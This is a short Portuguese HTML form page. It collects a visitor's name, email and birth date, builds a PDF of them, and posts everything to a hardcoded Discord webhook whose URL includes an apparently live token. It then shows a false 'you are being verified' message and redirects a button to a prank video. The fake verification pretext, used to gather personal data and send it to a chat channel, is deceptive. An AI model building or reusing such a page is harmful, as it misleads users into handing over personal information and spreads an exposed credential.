<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Formulário</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf-autotable/3.5.28/jspdf.plugin.autotable.min.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 400px;
            margin: 50px auto;
            padding: 20px;
            color: #333;
            transition: all 0.3s ease;
        }
        
        h1 {
            font-size: 24px;
            font-weight: normal;
            margin-bottom: 30px;
        }
        
        .form-field {
            margin-bottom: 20px;
        }
        
        .field-label {
            display: block;
            margin-bottom: 5px;
            font-size: 16px;
        }
        
        .optional {
            color: #999;
            font-style: italic;
        }
        
        input[type="text"], input[type="email"], input[type="date"] {
            width: 100%;
            padding: 8px 0;
            border: none;
            border-bottom: 1px solid #ccc;
            font-size: 16px;
            outline: none;
        }
        
        input[type="submit"] {
            background-color: transparent;
            color: #333;
            padding: 8px 20px;
            border: 1px solid #333;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            margin-top: 10px;
        }
        
        .verification-screen {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: white;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            text-align: center;
            z-index: 1000;
        }
        
        .verification-message {
            font-size: 18px;
            margin-bottom: 30px;
            max-width: 300px;
        }
        
        .verification-button {
            cursor: pointer;
            width: 100px;
            height: auto;
            transition: transform 0.2s;
        }
        
        .verification-button:hover {
            transform: scale(1.05);
        }
        
        .loading {
            display: none;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div id="form-container">
        <h1>Formulário</h1>
        
        <form id="main-form">
            <div class="form-field">
                <span class="field-label">Nome completo:</span>
                <input type="text" id="nome" name="nome" required>
            </div>
            
            <div class="form-field">
                <span class="field-label">Email:</span>
                <input type="email" id="email" name="email" required>
            </div>
            
            <div class="form-field">
                <span class="field-label">Data De nascimento <span class="optional">(Optional)</span>:</span>
                <input type="date" id="nascimento" name="nascimento">
            </div>
            
            <input type="submit" value="Verificar">
            <div class="loading" id="loading">Gerando PDF e enviando dados...</div>
        </form>
    </div>
    
    <div id="verification-screen" class="verification-screen">
        <p class="verification-message">Você está sendo verificado, enviaremos um Email quando você estiver certamente verificado</p>
        <img src="https://i.ibb.co/qhLdFGq/image.png" alt="Continuar" class="verification-button" id="verification-button">
    </div>

    <script>
        // Inicializa o jsPDF
        const { jsPDF } = window.jspdf;
        
        document.getElementById('main-form').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            // Mostra o loading
            document.getElementById('loading').style.display = 'block';
            
            // Coleta os dados do formulário
            const formData = {
                nome: document.getElementById('nome').value,
                email: document.getElementById('email').value,
                nascimento: document.getElementById('nascimento').value
            };
            
            try {
                // 1. Gera o PDF
                const pdf = new jsPDF();
                
                // Adiciona título
                pdf.setFontSize(18);
                pdf.text('Formulário de Cadastro', 105, 20, { align: 'center' });
                
                // Adiciona dados em formato de tabela
                pdf.setFontSize(12);
                pdf.text(`Nome: ${formData.nome}`, 20, 40);
                pdf.text(`Email: ${formData.email}`, 20, 50);
                if(formData.nascimento) {
                    pdf.text(`Data de Nascimento: ${new Date(formData.nascimento).toLocaleDateString()}`, 20, 60);
                }
                
                // Gera o PDF em base64
                const pdfOutput = pdf.output('datauristring');
                
                // 2. Prepara os dados para o webhook
                const webhookData = {
                    formData: formData,
                    pdfBase64: pdfOutput.split(',')[1] // Remove o prefixo data:application/pdf;base64,
                };
                
                // 3. Envia para o webhook (SUBSTITUA pela sua URL)
                const webhookUrl = 'https://discord.com/api/webhooks/1390729092311158826/OoTfhqLaBBCxEjh3Wl3WC-3RVXuFUwTkoPwEKM53whnNxGsAZrvPdkD1jPVGsU5gS29m'; // TROQUE PELA SUA URL
                
                const response = await fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(webhookData)
                });
                
                if(response.ok) {
                    // Mostra a tela de verificação
                    document.getElementById('verification-screen').style.display = 'flex';
                    document.getElementById('form-container').style.display = 'none';
                } else {
                    throw new Error('Falha ao enviar para o webhook');
                }
            } catch (error) {
                console.error('Erro:', error);
                alert('Ocorreu um erro ao processar seu formulário. Por favor, tente novamente.');
            } finally {
                document.getElementById('loading').style.display = 'none';
            }
        });
        
        document.getElementById('verification-button').addEventListener('click', function() {
            window.location.href = 'https://youtu.be/dQw4w9WgXcQ?si=KklLTsU2EasoHwNh'; // TROQUE ESTE LINK PELO SEU
        });
    </script>
</body>
</html>
